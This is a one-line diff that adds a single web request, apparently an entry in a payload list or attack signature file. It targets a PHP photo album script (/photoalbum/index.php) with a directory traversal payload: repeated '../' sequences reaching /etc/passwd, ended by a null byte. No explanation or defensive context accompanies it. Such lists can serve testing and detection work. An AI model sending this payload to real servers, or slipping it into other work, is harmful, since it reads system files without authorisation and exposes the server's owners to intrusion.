@@ -1,0 +1,1 @@
+/photoalbum/index.php?urlancien=&url=../../../../../../../../../../../../etc/passwd%00
